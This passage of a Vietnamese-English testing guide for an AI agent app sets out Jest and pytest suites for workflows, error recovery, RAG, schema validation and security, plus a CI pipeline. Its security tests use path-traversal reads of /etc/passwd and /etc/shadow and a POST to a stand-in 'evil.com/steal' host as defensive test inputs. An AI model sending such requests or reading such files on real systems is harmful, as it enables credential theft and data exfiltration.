    test('không lẫn lộn giữa 2 session khác nhau', async () => {
        // Session 1: toán học
        const session1 = [{ role: 'user', content: 'Gọi tôi là Anh' }];
        const r1 = await agent.chat(session1);

        // Session 2: riêng biệt
        const session2 = [{ role: 'user', content: 'Tên tôi là gì?' }];
        const r2 = await agent.chat(session2);

        // Session 2 không biết "Anh"
        expect(r2.at(-1).content).not.toContain('Anh');
    }, 30000);

    test('clarifying questions — agent hỏi lại khi thiếu thông tin', async () => {
        const messages = [{ role: 'user', content: 'Đặt lịch cho tôi' }]; // quá mơ hồ
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        // Agent phải hỏi thêm, không tự đặt lịch bừa
        expect(answer).toMatch(/khi nào|ngày|giờ|loại|event type|thông tin|chi tiết/i);
    }, 30000);
});
```

---

### 5.3 Error Recovery — Agent xử lý lỗi thông minh

```javascript
// __tests__/workflow/error_recovery.test.js
describe('Agent Error Recovery', () => {
    test('tool thất bại → agent đề xuất phương án thay thế', async () => {
        // Mock web_search để fail
        jest.spyOn(webSearchTool, 'func').mockResolvedValue(
            JSON.stringify({ success: false, error: 'Tavily API unavailable' }),
        );

        const messages = [{ role: 'user', content: 'Tìm thông tin về Node.js 22' }];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        // Agent phải thông báo về lỗi và đề xuất giải pháp
        expect(answer).toMatch(/không tìm được|lỗi|thử lại|cách khác|xin lỗi/i);
    }, 30000);

    test('schema validation fail → agent không crash, trả thông báo rõ ràng', async () => {
        const messages = [
            {
                role: 'user',
                content: 'Gửi email cho (không có địa chỉ email hợp lệ)',
            },
        ];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        expect(answer).toMatch(/email|địa chỉ|hợp lệ|cần/i);
        expect(answer).not.toMatch(/Error:|TypeError:|undefined/i); // no raw errors
    }, 30000);

    test('retry logic hoạt động khi tool timeout lần 1 nhưng ok lần 2', async () => {
        let callCount = 0;
        jest.spyOn(someTool, 'func').mockImplementation(async () => {
            callCount++;
            if (callCount === 1) throw new Error('Timeout');
            return JSON.stringify({ success: true, data: 'ok' });
        });

        // withRetry should handle this
        const result = await someTool.func({});
        expect(JSON.parse(result).success).toBe(true);
        expect(callCount).toBe(2);
    });
});
```

---

### 5.4 Complex Task Workflows — Đa bước, đa tool

```javascript
// __tests__/workflow/complex_tasks.test.js
describe('Complex Multi-tool Workflows', () => {
    test('Workflow: check time → tính toán → trả lời', async () => {
        // "Từ 14:00 giờ Hà Nội đến 23:59 cùng ngày còn bao nhiêu phút?"
        const messages = [
            {
                role: 'user',
                content: 'Từ 14:00 giờ Hà Nội (Asia/Ho_Chi_Minh) hôm nay đến 23:59 cùng ngày còn bao nhiêu phút?',
            },
        ];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        // Should give a number (minutes remaining from 14:00 to 23:59 = 599 minutes)
        expect(answer).toMatch(/\d+\s*(phút|minute)/i);
    }, 45000);

    test('Workflow: search → summarize', async () => {
        const messages = [
            {
                role: 'user',
                content: 'Tìm 3 tính năng nổi bật nhất của Node.js 22 và tóm tắt thành 1 đoạn ngắn',
            },
        ];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        expect(answer.length).toBeGreaterThan(100); // has meaningful content
        expect(answer).toMatch(/node\.?js|v22/i);
    }, 60000);

    test('Workflow: không thực thi action nguy hiểm khi thiếu confirm', async () => {
        // Agent persona: cần confirm trước khi delete/send
        const messages = [
            {
                role: 'user',
                content: 'Xóa tất cả files trong workspace của tôi',
            },
        ];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        // Agent phải hỏi confirm, không xóa ngay
        expect(answer).toMatch(/xác nhận|chắc chắn|confirm|bạn có muốn/i);
    }, 30000);

    test('Workflow: translate + format + respond in Vietnamese', async () => {
        const messages = [
            {
                role: 'user',
                content: 'Dịch "Hello, how are you today?" sang tiếng Việt và giải thích từng từ',
            },
        ];
        const result = await agent.chat(messages);
        const answer = result.at(-1).content;

        expect(answer).toMatch(/xin chào|thế nào|hôm nay/i);
    }, 30000);
});
```

---

## 6. RAG SERVICE TESTS (Python/pytest)

```python
# rag/tests/test_api.py
import pytest
from httpx import AsyncClient
from main import app

@pytest.mark.asyncio
async def test_health_endpoint():
    async with AsyncClient(app=app, base_url="http://test") as client:
        response = await client.get("/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"

@pytest.mark.asyncio
async def test_upload_pdf(tmp_path):
    pdf_content = b"%PDF-1.4 test content"
    async with AsyncClient(app=app, base_url="http://test") as client:
        response = await client.post(
            "/api/v1/rag/upload",
            files={"file": ("test.pdf", pdf_content, "application/pdf")},
        )
    assert response.status_code == 200
    data = response.json()
    assert "document_id" in data
    assert data["chunks_created"] > 0

@pytest.mark.asyncio
async def test_query_traditional_strategy(mock_chromadb):
    async with AsyncClient(app=app, base_url="http://test") as client:
        response = await client.post(
            "/api/v1/rag/query",
            json={"query": "What is the main topic?", "strategy": "traditional", "top_k": 5},
        )
    assert response.status_code == 200
    data = response.json()
    assert "answer" in data
    assert "sources" in data
    assert "confidence" in data
    assert 0 <= data["confidence"] <= 1

@pytest.mark.asyncio
async def test_query_all_strategies(mock_chromadb, mock_neo4j):
    async with AsyncClient(app=app, base_url="http://test") as client:
        response = await client.post(
            "/api/v1/rag/query",
            json={"query": "Complex query", "strategy": "all"},
        )
    assert response.status_code == 200
    data = response.json()
    assert len(data["selected_strategies"]) >= 1

@pytest.mark.asyncio
async def test_query_empty_database():
    async with AsyncClient(app=app, base_url="http://test") as client:
        response = await client.post(
            "/api/v1/rag/query",
            json={"query": "nonexistent_xyz_12345"},
        )
    assert response.status_code == 200
    # Should return low confidence, not 500
    assert response.json()["confidence"] < 0.5

# rag/tests/test_retrievers.py
class TestTraditionalRetriever:
    def test_returns_top_k_results(self, mock_chromadb):
        retriever = TraditionalRetriever()
        results = retriever.retrieve("test query", top_k=3)
        assert len(results) <= 3

    def test_results_have_required_fields(self, mock_chromadb):
        retriever = TraditionalRetriever()
        results = retriever.retrieve("test query", top_k=1)
        for r in results:
            assert "content" in r
            assert "source" in r
            assert "score" in r

    def test_deduplication(self, mock_chromadb_with_duplicates):
        # Kết quả không được có duplicates
        retriever = TraditionalRetriever()
        results = retriever.retrieve("test", top_k=10)
        contents = [r["content"] for r in results]
        assert len(contents) == len(set(contents))

class TestIngestion:
    def test_pdf_chunked_correctly(self):
        text = "A" * 2000  # longer than chunk size
        chunks = chunk_document(text, chunk_size=400, overlap=150)
        assert len(chunks) > 1
        # Verify overlap
        assert chunks[0][-150:] == chunks[1][:150]

    def test_supported_formats(self, tmp_path):
        for ext in [".pdf", ".docx", ".txt", ".md", ".json", ".csv"]:
            # Should not raise
            result = parse_document(tmp_path / f"test{ext}")
            assert result is not None
```

---

## 7. SCHEMA VALIDATION TESTS

> Verify mọi tool đều reject input sai và đưa ra Zod error rõ ràng

```javascript
// __tests__/unit/tools/schema_validation.test.js
import { tools } from '../../../backend/tools/index.js';

describe('Tool Schema Validation (Zod)', () => {
    const toolMap = Object.fromEntries(tools.map((t) => [t.name, t]));

    const invalidInputCases = [
        // [toolName, invalidInput, expectedErrorContains]
        ['calculate_math', {}, 'expression'],
        ['calculate_math', { expression: 123 }, 'string'], // wrong type
        ['send_email', { subject: 'hi', body: 'hi' }, 'to'], // missing 'to'
        ['book_event', { eventTypeId: 'abc' }, 'number'], // wrong type
        ['add_expense', { amount: 'abc', category: 'x' }, 'number'], // wrong type
        ['create_task', {}, 'title'],
        ['web_search', { query: '' }, 'min'], // empty string
        ['generate_qr_code', { content: null }, 'string'],
    ];

    test.each(invalidInputCases)('%s rejects invalid input: %j', async (toolName, input, errorFragment) => {
        const tool = toolMap[toolName];
        expect(tool).toBeDefined();

        await expect(tool.func(input)).rejects.toThrow();
        // OR returns fail with validation error
    });

    test('all tools have non-empty description', () => {
        tools.forEach((tool) => {
            expect(tool.description.length).toBeGreaterThan(20);
        });
    });

    test('all tools have .strict() schema (no extra fields)', () => {
        // Ensures tools reject unexpected fields
        tools.forEach((tool) => {
            expect(tool.schema._def.unknownKeys).toBe('strip'); // or 'strict'
        });
    });
});
```

---

## 8. PERFORMANCE & RELIABILITY TESTS

```javascript
// __tests__/unit/tools/reliability.test.js
describe('Tool Reliability', () => {
    test('withRetry retries 3 times on failure then throws', async () => {
        const failFn = jest.fn().mockRejectedValue(new Error('Flaky'));
        await expect(withRetry(failFn, 3, 10)).rejects.toThrow('Flaky');
        expect(failFn).toHaveBeenCalledTimes(3);
    });

    test('withRetry succeeds on 2nd attempt', async () => {
        let attempts = 0;
        const fn = jest.fn().mockImplementation(async () => {
            if (++attempts < 2) throw new Error('Temp fail');
            return 'ok';
        });
        const result = await withRetry(fn, 3, 10);
        expect(result).toBe('ok');
        expect(fn).toHaveBeenCalledTimes(2);
    });

    test('tool respects TOOL_TIMEOUT (30s)', async () => {
        jest.useFakeTimers();
        const slowFn = () => new Promise((resolve) => setTimeout(resolve, 35000));

        await expect(Promise.race([slowFn(), rejectAfter(30000)])).rejects.toThrow();
        jest.useRealTimers();
    });
});
```

---

## 9. SECURITY TESTS

```javascript
describe('Security Checks', () => {
    test('file tool blocks path traversal ../../', async () => {
        const result = JSON.parse(await readFileTool.func({ path: '../../etc/passwd' }));
        expect(result.success).toBe(false);
    });

    test('file tool blocks absolute paths outside workspace', async () => {
        const result = JSON.parse(await readFileTool.func({ path: '/etc/shadow' }));
        expect(result.success).toBe(false);
    });

    test('api_call does not forward internal credentials to external URLs', async () => {
        // Headers like Authorization should not leak internal tokens
        nock('https://evil.com').post('/steal').reply(200, {});
        const result = await apiCallTool.func({
            method: 'POST',
            url: 'https://evil.com/steal',
            body: {},
        });
        // Tool should succeed but NOT inject internal env vars
    });

    test('email tool validates recipient format', async () => {
        const result = JSON.parse(
            await sendEmailTool.func({
                to: 'not-an-email',
                subject: 'Hi',
                body: 'Hello',
            }),
        );
        expect(result.success).toBe(false);
    });
});
```

---

## 10. CHẠY TESTS

### Scripts

```json
// package.json
{
    "scripts": {
        "test": "jest",
        "test:unit": "jest --testPathPattern=unit --coverage",
        "test:integration": "jest --testPathPattern=integration --runInBand",
        "test:workflow": "jest --testPathPattern=workflow --runInBand --testTimeout=120000",
        "test:security": "jest --testPathPattern=security",
        "test:watch": "jest --watch",
        "test:rag": "cd rag && pytest tests/ -v --cov=. --cov-report=html"
    }
}
```

### CI Pipeline (GitHub Actions)

```yaml
# .github/workflows/test.yml
name: Agent Tests
on: [push, pull_request]
jobs:
    unit-integration:
        runs-on: ubuntu-latest
        steps:
            - uses: actions/checkout@v4
            - uses: actions/setup-node@v4
              with: { node-version: '18' }
            - run: pnpm install
            - run: pnpm test:unit
            - run: pnpm test:integration
            - uses: codecov/codecov-action@v4

    workflow-tests:
        runs-on: ubuntu-latest
        if: github.ref == 'refs/heads/main' # chỉ chạy trên main
        env:
            OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        steps:
            - uses: actions/checkout@v4
            - run: pnpm install && pnpm test:workflow

    rag-tests:
        runs-on: ubuntu-latest
        steps:
            - uses: actions/checkout@v4
            - uses: actions/setup-python@v5
              with: { python-version: '3.10' }
            - run: pip install -r requirements.txt pytest pytest-asyncio httpx pytest-cov
            - run: pnpm test:rag
```

---

## 11. CHECKLIST ĐỊNH NGHĨA "PASSED"

| Category                | Criteria                                              |
| ----------------------- | ----------------------------------------------------- |
| **Unit Tests**          | ✅ Tất cả tools có ≥ happy path + error path          |
| **Schema**              | ✅ Zod reject input sai type/thiếu field              |
| **Security**            | ✅ Path traversal bị chặn, email validation hoạt động |
| **Integration**         | ✅ API trả đúng status codes (200/400/500)            |
| **Conversation**        | ✅ History maintained, window = 10 messages           |
| **Tool Selection**      | ✅ Agent chọn đúng tool cho từng loại query           |
| **Error Recovery**      | ✅ Agent không crash khi tool thất bại                |
| **Multi-turn**          | ✅ Context nhất quán trong session                    |
| **Destructive Actions** | ✅ Delete/send yêu cầu confirm từ user                |
| **RAG**                 | ✅ Upload → query → answer có sources                 |
| **Coverage**            | ✅ ≥ 80% lines cho tools, ≥ 70% cho services          |
| **Performance**         | ✅ Unit tests < 100ms, Integration < 5s               |
